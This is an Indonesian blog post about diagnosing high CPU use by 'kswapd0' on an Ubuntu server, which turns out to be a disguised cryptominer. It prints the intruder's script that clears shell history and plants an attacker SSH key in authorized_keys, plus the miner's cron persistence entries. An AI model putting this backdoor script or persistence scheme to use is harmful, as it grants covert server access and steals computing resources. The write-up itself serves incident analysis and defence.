---
title: How to Deal With High CPU Usage kswapd0 on Linux
lang: id-ID
description: High CPU Usage pada aplikasi kswapd0 bisa berarti SWAP atau bahkan Mining.
image: /images/covers/how-to-deal-with-kswapd0-on-linux.jpg
published: 09/30/2020, 10:55:23 AM
category: devops
author: Ryan Aunur Rassyid
tags: kswapd0,ubuntu,linux,debian,cpu,production,server
meta:
  - name: keywords
    content: kswapd0,ubuntu,linux,debian,cpu,production,server
feed:
  enable: true
---
# How to Deal With High CPU Usage kswapd0 on Linux

<Author name="Ryan Aunur Rassyid" />
<FeaturedImage 
  src="/images/covers/how-to-deal-with-kswapd0-on-linux.jpg"
  author="Jase Bloor"
  source="unsplash.com"
  sourceLink="https://unsplash.com/photos/By1VMCg3K4I" />

## Introduction
Beberapa waktu yang lalu penulis sempat menghandle Project yang menggunakan server fisik (bukan VPS). Server tersebut menggunakan Ubuntu 16.04 sebagai *Operating System*-nya. Namun OS yang dipakai tidak sama dengan OS yang penulis pakai setiap kali deploy VPS, padahal versi Ubuntu yang dipakai sama persis yaitu Ubuntu 16.04 tapi serasa seperti Debian. Banyak package package yang hilang atau tidak ada padahal package tersebut seharusnya ada di OS tersebut bahkan fresh install sekalipun. 

Aplikasi berjalan baik dan tanpa kendala, hanya saja berjalan agak pelan untuk ukuran server dengan prosessor 8 core tersebut. Seharusnya aplikasi berjalan lebih baik bukan?. Oke mulai mulai dari sini mulai curiga. Apakah server menjalankan aplikasi lain yang menyebabkan aplikasi lain tidak memiliki cukup resource yang dipakai atau aplikasi yang kita kerjakan memang lamban. Akhirnya investigasi dimulai.

## Table of Contents
[[toc]]

## Apa itu kswapd0?
Singkat cerita ditemukan akar masalahnya, yaitu aplikasi **kswapd0** yang berjalan menggunakan resource CPU 100% terus menerus. Ini sangat tidak wajar untuk aplikasi yang mengatur dan me-*manage* SWAP atau virtual memory pada Linux. Karena ini hal baru yang belum pernah penulis jumpai selama memakai SWAP di Linux, jadi penulis mencoba mengumpulkan informasi dari semua forum-forum apa itu *kswapd0* dan mengapa memakan resource CPU yang banyak.

Ada forum yang berpendapat bahwa kejadian ini adalah bug dari linux yang harusnya sudah di-fix di versi yang baru sedangkan ada beberapa orang berpendapat bahwa ini disebabkan oleh server yang menggunaakn hardisk dari pada SSD sebagai SWAP sehingga CPU dan Hardisk dipaksa bekerja dengan semaksimal mungkin. Team memutuskan untuk upgrade versi package yang kadarluasa dengan menjalankan `apt get upgrade`. Dan bener saja banyak package yang diupgrade pada waktu itu. Namun ini tidak menuntaskan masalah, **kswapd0** tetap berjalan.

![kswapd0 terlihat berjalan di aplikasi monitoring htop](https://telegra.ph/file/2b542fc07f6a6a176c072.jpg)
*Aplikasi kswapd0 terlihat berjalan di aplikasi monitoring htop*

### What now?
Akhirnya kami putuskan untuk menghapus SWAP dari pada penggunaan CPU terus dipakai tanpa ampun. Setelah dihapus apakah masalah ini selesai? sayangnya tidak. Aplikasi tersebut masih berjalan bahkan tanpa adanya SWAP. Lalu apa sebenernya eksistensi dari aplikasi ini?. Akhirnya penulis putuskan untuk investigasi mendalam dan mencoba mengumpulkan informasi lagi di forum. Kali ini penulis mendapatkan secercah cahaya apa maksud dari semua ini. Setelah membaca log Cron Job yang mencurigakan akhirnya didapati pertanyaan yang related dengan masalah ini.

:::: preview https://askubuntu.com/questions/1161003/strange-cron-job-takes-up-100-of-cpu-ubuntu-18-lts-server

::: preview-content Strange Cron Job takes up 100% of CPU Ubuntu 18 LTS Server - Ask Ubuntu
I keep getting weir cron jobs showing up and I have no clue what they do. I typically issue kill -9  to stop them. They take up 100% of my CPU and can run for days until I check. Does anyone know w...

askubuntu.com
:::
::: preview-thumbnail https://cdn.sstatic.net/Sites/askubuntu/Img/apple-touch-icon@2.png?v=c492c9229955
:::
::::

Usut punya usut ternyata aplikasi tersebut adalah aplikasi **Crypto Mining**. Siapa sangka aplikasi ini bisa masuk pada sistem operasi linux yang baru di install. Aplikasi Crypto Mining sendiri adalah aplikasi yang menjalankan proses mining (memecahkan algoritma rumit) yang memerlukan sebuah resource khususnya CPU atau GPU. Keuntungan yang didapat dari mining adalah Cryptocurrency atau mata uang digital. Karena aplikasi ini berjalan tanpa izin dan dijalankan pada komputer atau server orang lain maka aplikasi ini termasuk tindakan yang merugikan orang lain. Aplikasi ini berjalan tanpa henti dan menggunakan semua resource CPU yang ada hingga 100% yang bisa memperpendek umur prosessor karena dipaksa melakukkan pekerjaan keras dalam waktu lama dan terus menerus.

### Menghapus aplikasi
Tidak ada faedahnya membuat aplikasi ini tetap berada di server. Alih alih membiarkan aplikasi tetap berjalan saya memilih untuk menghapus aplikasi ini. Sebelum itu saya lebih penasaran bagaimana aplikasi ini bisa masuk. Asumsi awal adalah aplikasi ini masuk dengan cara SCP atau transfer remote file melalui SSH. Kok bisa? bisa, karena di SSH folder `$HOME/.ssh/` ada file `authorized_keys` yang artinya orang bisa mengakses server kapan saja tanpa password karena Linux mempercayai sepenuhnya pelaku. Dan ini bisa terjadi karena OS yang di-install bukan dari OS resmi dari Ubuntu atau Debian dengan kata lain injected. File instalasi OS bisa saja di susupi script untuk membuat `authorized_keys` seperti berikut.

```bash
set +o history
export PATH=/home/user/.bin:$PATH
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod 700 .ssh && cd .ssh && chmod 600 authorized_keys && cd ~
```

Setelah pelaku sudah memiliki akses ke server kita melalui ssh, selanjutnya pelaku tinggal mengirim file mining tersebut ke server kita dan menjalankan nya dengan cron job. Kenapa cron job? karena disini aplikasi akan mendeteksi apakah aplikasi mining nya berjalan atau tidak. Apabila aplikasi dihentikan paksa dengan `kill -9 PID` misalnya, maka aplikasi akan kembali berjalan setelah beberapa menit. Dan jika file aplikasi di hapus maka secara otomatis aplikasi akan di sync untuk mendapatkan file crypto mining dan menjalankannya kembali. Terdengar menarik bukan.

```bash
1 1 */2 * * /home/user/.configrc/a/upd>/dev/null 2>&1
@reboot /home/user/.configrc/a/upd>/dev/null 2>&1
5 8 * * 0 /home/user/.configrc/b/sync>/dev/null 2>&1
@reboot /home/user/.configrc/b/sync>/dev/null 2>&1  
0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude>/dev/null 2>&1
```

Dan ini adalah struktur folder dari folder aplikasi tersebut disimpan `$HOME/.configrc`. Nama folder yang cukup meyakinkan untuk tidak di cek, karena kita akan berfikir bahwa folder ini mungkin bagian dari folder `.config` yang hanya berisi config dari aplikasi-aplikasi di linux.

```
.
├── a
│   ├── a
│   ├── bash.pid
│   ├── dir.dir
│   ├── init0
│   ├── kswapd0
│   ├── run
│   ├── stop
│   └── upd
├── b
│   ├── a
│   ├── dir.dir
│   ├── run
│   ├── stop
│   └── sync
├── cron.d
└── dir2.dir
```

Setelah aplikasi di berhentikan dan dihapus dari server, penggunaan resource CPU menjadi normal kembali. Untuk meyakinkan bahwa program tersebut sudah tidak aktif kembali dan semua file dan service sudah dihapus dan berhenti, kami menunggu untuk beberapa saat. Yes, aplikasi tidak berjalan kembali dan di monitoring system juga tidak nampak keanehan kembali.

### Virus Total
Kita pastikan kembali bahwa ini adalah aplikasi Crypto Mining dengan cara upload file **kswapd0** tersebut ke website [virustotal](https://www.virustotal.com/gui/file/fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708/detection). Hasilnya dipastikan bahwa ini bukan file **kswapd0** yang asli atau bawaan Linux melainkan aplikasi Crypto Mining.

![Hasil scan pada website VirusTotal.com](https://telegra.ph/file/9c9b44a1073398b6c30a5.png)
*Hasil scan pada website [VirusTotal.com](https://www.virustotal.com/gui/file/fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708/detection)*

## Kesimpulan
Sebuah aplikasi yang menggunakan resource berlebih apalagi CPU perlu kita curigai dan usut sampai tuntas apa yang menyebabkan ia menggunakan CPU dengan tidak normal seperti itu. Dalam kasus ini aplikasi bernama **kswapd0** ini menjelma menjadi sebuah aplikasi yang cukup *make sense* untuk menggunakan resource besar tapi *behavior* dari aplikasi ini sendiri tidak seperti pada umunya. 

Dari sini kita bisa mengambil pelajaran bahwa jangan langsung percaya dengan apa yang kita lihat. Sebelum ada bukti yang kuat kita tidak bisa mengatakan bahwa aplikasi ini baik baik saya dan berjalan sebagaimana mestinya. Bisa jadi aplikasi tersebut sedang menyamar menjadi aplikasi lain.

<Disqus />

